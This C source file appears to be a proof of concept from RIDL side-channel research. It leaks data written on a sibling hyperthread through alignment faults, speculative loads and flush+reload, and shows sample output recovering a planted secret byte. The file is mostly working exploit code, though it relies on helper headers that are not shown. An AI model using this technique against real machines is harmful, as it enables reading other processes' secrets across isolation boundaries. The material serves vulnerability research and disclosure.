/*
Leak written data across hyperthreads using alignment faults, without TSX.

Notes:
 * important that we do a load first

Expected output:
$ taskset -c 3,7 ./alignment_write 
offset 9:
00004588: 00 (?)
00005127: 89 (?)
*/
#define ITERS 10000
#define SECRET_VALUE 0x89

#define START 9
#define END 10

#include "ridl.h"

int main(int argc, char *argv[]) {
	(void)argc; (void)argv;

	enable_SSBM();

#include "fork_vectorwrite_secret.inc"

	ALLOC_BUFFERS();

	for (size_t offset = START; offset < END; ++offset) {
		memset(results, 0, sizeof(results));

		enable_alignment_checks();
		for (size_t i = 0; i < ITERS; ++i) {
			// next load -> read
			asm volatile("mov 0x0(%%rsp), %%rax\n":::"rax");
			flush(reloadbuffer);
			asm volatile("mfence\n");
			speculate_leak_normal(leak + offset, reloadbuffer);
			reload(reloadbuffer, results);
		}
		disable_alignment_checks();

		printf("offset %d:\n", (int)offset);
		print_results(results);
	}

	kill(pid, SIGKILL);
}

